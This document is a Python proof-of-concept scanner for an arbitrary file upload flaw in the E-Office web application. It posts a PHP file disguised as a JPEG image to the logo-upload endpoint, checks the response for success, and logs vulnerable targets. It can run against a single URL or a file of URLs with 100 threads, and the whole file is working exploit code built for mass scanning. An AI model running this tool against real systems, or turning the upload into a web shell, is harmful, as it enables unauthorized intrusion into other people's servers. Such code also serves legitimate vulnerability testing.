import requests
import argparse
import sys,json,urllib3
from multiprocessing.dummy import Pool
from termcolor import colored           #导入颜色库
urllib3.disable_warnings()              #抑制警告

def banner():
    demo ="""
███████╗           ██████╗ ███████╗███████╗██╗ ██████╗███████╗
██╔════╝          ██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝
█████╗█████╗█████╗██║   ██║█████╗  █████╗  ██║██║     █████╗  
██╔══╝╚════╝╚════╝██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝  
███████╗          ╚██████╔╝██║     ██║     ██║╚██████╗███████╗
╚══════╝           ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝
"""
    colored_demo = colored(demo, 'blue')
    print(colored_demo)

def main():
    banner()
    parser=argparse.ArgumentParser(description="welcome to use!")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file,'r',encoding='utf-8')as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    headers ={
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/86.0.4240.111Safari/537.36',
        'Connection': 'close',
        'Content-Length': '192',
        'Content-Type': 'multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4',
    }
    data = '--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo();?>\r\n--e64bdf16c554bbc109cecef6451c26a4--'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res.status_code == 200 and 'logo-eoffice.php' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8')as ff:
                ff.write(f'[+]{target}存在漏洞'+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception:
        print(f"{target}该站点存在问题!")

if __name__ == '__main__':
    main()